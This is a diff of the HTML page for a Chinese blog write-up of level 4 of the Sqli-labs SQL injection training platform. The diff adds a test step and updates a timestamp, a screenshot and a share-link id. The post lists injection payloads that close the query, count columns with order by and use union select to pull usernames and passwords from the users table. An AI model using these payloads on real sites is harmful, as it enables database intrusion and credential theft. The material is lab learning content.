@@ -21,7 +21,7 @@
 <meta property="og:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-4)第四关开始 老规矩，单引号测试下 哟呵，小娘子，没报错。那么咱们就测试下双引号 发现报错了，报错内容：near &amp;#39;&amp;quot;1&amp;quot;&amp;quot;) LIMIT 0,1&amp;#39; at line 1 ok，猜测后台查询语句格式如下： select * from users where id = (&amp;quot;$id&amp;qu">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.imgur.com/F0ZQkyT.png">
-<meta property="og:updated_time" content="2018-10-19T08:54:19.222Z">
+<meta property="og:updated_time" content="2018-10-19T09:12:53.571Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs-less-4通关笔记">
 <meta name="twitter:description" content="Sql注入学习笔记——基于Sqli-labs平台(Less-4)第四关开始 老规矩，单引号测试下 哟呵，小娘子，没报错。那么咱们就测试下双引号 发现报错了，报错内容：near &amp;#39;&amp;quot;1&amp;quot;&amp;quot;) LIMIT 0,1&amp;#39; at line 1 ok，猜测后台查询语句格式如下： select * from users where id = (&amp;quot;$id&amp;qu">
@@ -187,6 +187,7 @@
 <p><code>select * from users where id = (&quot;$id&quot;) limit 0,1</code></p>
 <p>输入<br><code>index.php?id=1&quot;)--+</code>测试<br><img src="https://i.imgur.com/v1xmdkF.png" alt="index.php?id=1&quot;)测试"></p>
 <p>页面正常了，证明语句闭合成功，接下来就是老套路了。</p>
+<p>测试and 1=1和and 1=2</p>
 <p>order by 查询字段数量<br><code>index.php?id=1&quot;) order by 1--+</code><br>.<br>.<br><code>index.php?id=1&quot;) order by 4--+</code><br>测试出为三个字段</p>
 <p>接下来测试回显位</p>
 <p><code>index.php?id=-1&quot;) union select 1,2,3--+</code></p>
@@ -195,7 +196,7 @@
 <p>所以我就直接最后一步</p>
 <p><code>index.php?id=-1&quot;) union select 1,username,password from users limit 3,1--+</code></p>
 <p>为了验证注入成功，我选择users表中的第4行数据</p>
-<p><img src="https://i.imgur.com/OAxaAzY.png" alt="最终数据"></p>
+<p><img src="https://i.imgur.com/ZYoRmBv.png" alt="最终数据"></p>
 
         </div>
         <footer class="article-footer">
@@ -203,7 +204,7 @@
 
 
 
-    <a data-url="https://leaderzhang.github.io/2018/10/19/sqli-labs-less4/" data-id="cjnfs2tof000bw4nudcymtk22" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="https://leaderzhang.github.io/2018/10/19/sqli-labs-less4/" data-id="cjnfsr04h000dd8nuzph4d605" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
